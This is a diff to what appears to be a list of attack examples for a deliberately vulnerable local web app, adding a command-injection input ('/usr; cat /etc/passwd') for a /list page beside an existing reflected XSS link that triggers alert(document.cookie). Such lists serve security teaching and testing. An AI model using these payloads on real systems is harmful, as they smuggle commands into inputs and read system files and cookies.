@@ -58,3 +58,6 @@ Page: /news_alert
 Clicking on link: `http://localhost:3000/news_alert?search=0%22);%20alert(document.cookie%2B%20%22`
 
 ### Example 8
+
+Page: /list
+Enter as folder to list: `/usr; cat /etc/passwd`
